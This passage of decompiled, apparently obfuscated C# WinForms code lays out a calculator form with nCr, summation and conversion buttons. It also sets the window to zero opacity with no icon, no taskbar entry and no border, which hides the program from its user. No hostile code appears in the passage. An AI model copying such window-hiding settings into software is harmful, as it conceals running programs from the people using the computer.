		((Control)btn_ncr).set_Location(new Point(152, 17));
		((Control)btn_ncr).set_Name("btn_ncr");
		((Control)btn_ncr).set_Size(new Size(45, 36));
		((Control)btn_ncr).set_TabIndex(44);
		((ButtonBase)btn_ncr).set_Text("nCr");
		((ButtonBase)btn_ncr).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_sigma_n1).set_BackColor(Color.Transparent);
		((ButtonBase)btn_sigma_n1).set_FlatStyle((FlatStyle)1);
		((Control)btn_sigma_n1).set_Font(new Font("Georgia", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_sigma_n1).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_sigma_n1).set_Location(new Point(106, 17));
		((Control)btn_sigma_n1).set_Name("btn_sigma_n1");
		((Control)btn_sigma_n1).set_Size(new Size(45, 36));
		((Control)btn_sigma_n1).set_TabIndex(43);
		((ButtonBase)btn_sigma_n1).set_Text("n∑1");
		((ButtonBase)btn_sigma_n1).set_UseVisualStyleBackColor(false);
		((ButtonBase)btn_sigma_nr).set_BackColor(Color.Transparent);
		((ButtonBase)btn_sigma_nr).set_FlatStyle((FlatStyle)1);
		((Control)btn_sigma_nr).set_Font(new Font("Georgia", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btn_sigma_nr).set_ForeColor(Color.WhiteSmoke);
		((Control)btn_sigma_nr).set_Location(new Point(60, 17));
		((Control)btn_sigma_nr).set_Name("btn_sigma_nr");
		((Control)btn_sigma_nr).set_Size(new Size(45, 36));
		((Control)btn_sigma_nr).set_TabIndex(42);
		((ButtonBase)btn_sigma_nr).set_Text("n∑r");
		((ButtonBase)btn_sigma_nr).set_UseVisualStyleBackColor(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.FromArgb(0, 192, 0));
		((Control)this).set_BackgroundImage((Image)(object)Class6.smethod_1());
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(702, 555));
		((Control)this).set_ContextMenuStrip(cms_1);
		((Control)this).get_Controls().Add((Control)(object)grp_algebra);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)cmb_box_unit);
		((Control)this).get_Controls().Add((Control)(object)btn_f);
		((Control)this).get_Controls().Add((Control)(object)btn_c);
		((Control)this).get_Controls().Add((Control)(object)grp_conversion);
		((Control)this).get_Controls().Add((Control)(object)btn_b);
		((Control)this).get_Controls().Add((Control)(object)btn_a);
		((Control)this).get_Controls().Add((Control)(object)grp_advance_bottom);
		((Control)this).get_Controls().Add((Control)(object)btn_e);
		((Control)this).get_Controls().Add((Control)(object)grp_advance_top);
		((Control)this).get_Controls().Add((Control)(object)btn_d);
		((Control)this).get_Controls().Add((Control)(object)grp_basic);
		((Control)this).get_Controls().Add((Control)(object)btn_close);
		((Control)this).get_Controls().Add((Control)(object)btn_minimize);
		((Control)this).get_Controls().Add((Control)(object)txtmain);
		((Control)this).get_Controls().Add((Control)(object)MenuStrip1);
		((Control)this).set_Cursor(Cursors.get_PanNW());
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MainMenuStrip(MenuStrip1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)grp_basic).ResumeLayout(false);
		((Control)grp_advance_top).ResumeLayout(false);
		((Control)grp_advance_top).PerformLayout();
		((Control)grp_advance_bottom).ResumeLayout(false);
		((Control)grp_conversion).ResumeLayout(false);
		((Control)grp_conversion).PerformLayout();
		((Control)MenuStrip1).ResumeLayout(false);
		((Control)MenuStrip1).PerformLayout();
		((Control)cms_1).ResumeLayout(false);
		((Control)grp_algebra).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
